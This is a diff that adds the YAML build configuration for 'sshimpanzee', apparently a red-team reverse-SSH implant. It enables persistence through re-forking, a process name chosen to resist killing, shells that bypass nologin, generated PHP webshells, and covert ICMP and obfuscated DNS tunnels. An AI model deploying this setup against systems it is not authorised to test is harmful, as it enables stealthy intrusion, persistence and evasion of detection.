@@ -1,0 +1,73 @@
+###
+# This is sshimpanzee build configuration file
+# YAML is used to describe what behaviour and feature should the sshimpanzee get
+###
+
+### General config
+
+process_name: "sshimpanzee" # Name of the process as it appears in ps (yet you won't be able to kill it with this name)
+
+
+banner: True # Should the banner be displayed at log
+verbose: 3 # Verbosity level as written in build/build.log
+
+shell: "/bin/sh" # Default shell to pop for user, bypassing /etc/passwd entries with false or nologin as shell
+timer: 60*1000*1000  # Time in milliseconds before a new sshimpanzee child is forked after exiting. For example in sock MODE, a new sshd connection will be made 1 minute after the previous one is dead
+
+keygen: True # Re generate keys during build, insure a new HOST and CLIENT keys is used
+public_key: #if new keys are not regenerated it is possible to specify a public client key to authenticate (only ed25519 keys are supported)
+#public key: "ssh-ed25519 .... ROGUE@ROGUE"
+
+make: True # Keep it to true if you want the builder script to generate sshd binary
+force_clean_build: True #Currently required for docker builds, will force builder script to recompile tunnels and dependances
+reconf: True # Required for docker builds
+
+
+### Environment
+# sshimpanzee is configured at runtime through environment variables, yet, it is possible to preset environment variable, to get a default behavior
+
+
+env:
+  if_not_set : # Variable here will be set if they do not already exists
+    REMOTE: 127.0.0.1
+    PORT: 8080
+    MODE: sock # MODE environment variable is used to manage the default tunnel
+  overwrite: # Variable here will overwrite already existent 
+    
+
+### Tunnels
+# sshimpanzee come with different tunneling mecanisms
+# To speed up compilation time, and more importantly to get a lighter binary it is possible to include or exclude some tunnels
+# Tunnel compilation parameters can be specified here 
+tun:
+  sock:
+      enabled: True
+
+  icmp:
+      enabled: True
+      buildserv: True # should the corresponding ICMPTunnel server be built 
+      raw_sock: False # build with support for raw sock for older kernels
+
+  http_enc :
+      enabled: True
+      key: # web shell key, empty will result in a new key being generated
+      targets:
+        - "php" # list of language you want to generate webshells for 
+      path_fd: "/dev/shm/sshim" # Fifo that sshimpanzee will use to communicate with webshells
+
+  dns:
+      enabled: True    
+      resource: sshimpanzee # DNS2TCP Resource
+      key: sshimpanzee # DNS2TCP key
+      obfuscate: True # obfuscating DNS2TCP Magic string, this will force the build of the corresponding srver
+      buildserv: False 
+      qtype: TXT # Type of query used by DNS2TCP
+
+  proxysock:
+      enabled: True
+
+  no_build:
+      enabled: False 
+      path: []
+
+
